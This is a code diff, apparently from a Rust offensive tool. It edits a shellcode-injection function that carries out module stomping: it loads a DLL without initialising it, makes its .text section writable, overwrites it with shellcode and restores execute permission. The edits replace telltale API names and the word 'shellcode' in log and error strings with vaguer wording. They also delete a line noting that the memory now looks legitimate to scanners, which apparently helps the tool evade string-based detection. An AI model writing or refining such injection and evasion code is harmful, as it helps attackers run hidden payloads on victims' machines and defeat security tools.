@@ -18,7 +18,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
     let dll_name = CString::new(victim.as_str())
         .map_err(|_| "invalid DLL name".to_string())?;
 
-    log.step("[1/5] LoadLibraryExA(victim, DONT_RESOLVE_DLL_REFERENCES)".to_string());
+    log.step("[1/5] Load victim module (no init)".to_string());
     let module = unsafe {
         resolve::LoadLibraryExA(
             dll_name.as_ptr() as *const u8,
@@ -27,7 +27,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         )
     };
     if module.is_null() {
-        return Err("LoadLibraryExA(victim) failed".to_string());
+        return Err("library load failed".to_string());
     }
     let base = module as *const u8;
     log.detail(format!("  Module base: 0x{:016X}", base as usize));
@@ -41,14 +41,14 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
 
     if shellcode.len() > text.size {
         return Err(format!(
-            "shellcode ({} bytes) exceeds .text section ({} bytes)",
+            "payload ({} bytes) exceeds .text section ({} bytes)",
             shellcode.len(),
             text.size
         ));
     }
 
     log.step(format!(
-        "[3/5] VirtualProtect(.text, PAGE_READWRITE) — {} bytes",
+        "[3/5] Make .text writable — {} bytes",
         text.size
     ));
     let mut old_protect: u32 = 0;
@@ -61,11 +61,11 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect(RW) failed".to_string());
+        return Err("memory protection change (RW) failed".to_string());
     }
 
     log.step(format!(
-        "[4/5] Overwrite .text with {} bytes of shellcode",
+        "[4/5] Overwrite .text with {} bytes",
         shellcode.len()
     ));
     unsafe {
@@ -76,7 +76,7 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         );
     }
 
-    log.step("[5/5] VirtualProtect(.text, PAGE_EXECUTE_READ)".to_string());
+    log.step("[5/5] Restore .text protection (RX)".to_string());
     let ok = unsafe {
         resolve::VirtualProtect(
             text.base as *const std::ffi::c_void,
@@ -86,16 +86,13 @@ pub fn live_inject(shellcode: &[u8], log: &LogSink) -> Result<InjectionResult, S
         )
     };
     if ok == 0 {
-        return Err("VirtualProtect(RX) failed".to_string());
+        return Err("memory protection change (RX) failed".to_string());
     }
 
     log.info(format!(
-        "  ✓ Module stomped: shellcode at 0x{:016X} inside victim .text",
+        "  Complete: payload at 0x{:016X} inside module .text",
         text.base
     ));
-    log.warning(
-        "  Memory is now backed by a signed DLL — appears legitimate to scanners".to_string(),
-    );
 
     Ok(InjectionResult {
         remote_base: text.base as u64,
